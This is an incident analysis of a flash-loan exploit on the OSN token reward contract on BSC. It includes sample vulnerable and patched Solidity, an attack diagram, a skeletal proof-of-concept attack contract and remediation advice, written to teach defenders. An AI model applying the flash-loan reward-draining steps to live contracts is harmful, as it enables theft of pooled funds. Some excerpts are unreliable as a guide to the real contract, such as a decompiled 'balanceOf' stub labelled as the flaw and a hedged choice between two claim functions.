# OSN — Reward Distribution Hold Duration Unchecked Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | OSN |
| **Chain** | BSC |
| **Loss** | ~$109,000 |
| **Root Cause** | The reward distribution contract does not check token hold duration, allowing immediate reward claims after acquiring a large balance within a single block |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/OSN_exp.sol) |

---

## 1. Vulnerability Overview

The OSN protocol's reward distribution mechanism calculates rewards based on the current token balance, but does not verify how long that balance has been held. An attacker borrowed a large amount of OSN tokens via flash loan and immediately claimed rewards without any hold duration, draining the entire reward pool. This attack bypasses the fundamental design principle of staking rewards — "time-weighted rewards."

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no hold duration check
contract OSNReward {
    mapping(address => uint256) public rewards;

    function distributeReward(address user) external {
        uint256 balance = OSN.balanceOf(user);
        // ← no hold duration check
        // balance just received via flash loan is applied as-is
        rewards[user] = balance * rewardRate / totalSupply;
    }

    function claimReward() external {
        uint256 reward = rewards[msg.sender];
        rewards[msg.sender] = 0;
        BUSD.transfer(msg.sender, reward);
    }
}

// ✅ Safe code: minimum hold duration + snapshot-based rewards
mapping(address => uint256) public holdStart;
mapping(address => uint256) public holdBalance;

function _afterTokenTransfer(address from, address to, uint256 amount) internal {
    // reset hold start time on balance change
    holdStart[to] = block.timestamp;
    holdBalance[to] = OSN.balanceOf(to);
}

function claimReward() external {
    require(block.timestamp >= holdStart[msg.sender] + MIN_HOLD_DURATION, "hold too short");
    uint256 reward = holdBalance[msg.sender] * rewardRate / totalSupply;
    BUSD.transfer(msg.sender, reward);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: OSN_decompiled.sol
contract OSN {
    function balanceOf(address p0) external view returns (uint256) {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Borrow large amount of OSN tokens via flash loan
  │         └─ hold duration = 0 (just received)
  │
  ├─→ [2] Set up OSN pool via CREATE2 or addLiq() function
  │
  ├─→ [3] Call distributeReward(attacker) or cc()
  │         └─ no hold duration check
  │         └─ rewards accrued based on large balance
  │
  ├─→ [4] claimReward() or withdraw rewards
  │
  ├─→ [5] Return OSN tokens + repay flash loan
  │
  └─→ [6] ~$109K profit (BUSD)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IOSNReward {
    function addLiq() external;     // add liquidity (attack setup)
    function cc() external;         // reward claim trigger
}

contract AttackContract {
    IOSNReward constant reward = IOSNReward(/* OSN Reward contract */);
    IERC20     constant OSN    = IERC20(/* OSN token */);
    IERC20     constant BUSD   = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function testExploit() external {
        // [1] borrow large amount of OSN via flash loan (hold duration = 0)
        flashLoanOSN(largeAmount);
    }

    function flashCallback() external {
        // [2] set up OSN pool via addLiq
        OSN.approve(address(reward), OSN.balanceOf(address(this)));
        reward.addLiq();

        // [3] claim rewards via cc() with no hold duration
        // no hold duration check → large rewards accrued from just-received balance
        reward.cc();

        // [4] receive rewards (BUSD)
        uint256 busdReward = BUSD.balanceOf(address(this));

        // [5] repay flash loan
        OSN.transfer(lender, largeAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Reward distribution hold duration unchecked |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (flash loan + immediate reward claim) |
| **DApp Category** | Token holding reward protocol |
| **Impact** | Full reward pool drained (~$109K) |

## 6. Remediation Recommendations

1. **Minimum hold duration**: Reward claims should only be allowed after a minimum of N blocks/hours have elapsed since token receipt
2. **Snapshot-based rewards**: Calculate rewards using historical snapshot balances instead of current balance
3. **Time-weighted balance**: Calculate rewards as `balanceOf × holdDuration`
4. **Exclude flash loan balances**: Exclude balances received within the same block from reward calculations

## 7. Lessons Learned

- Token balance-based reward systems must always be designed with flash loan attacks in mind.
- Even without manipulating reward-related parameters as in GROKD (2024-04), an immediate claim with no hold duration is sufficient to drain the entire reward pool.
- The core invariant of staking/holding reward mechanisms — "rewards only for those who have waited" — must be enforced in code.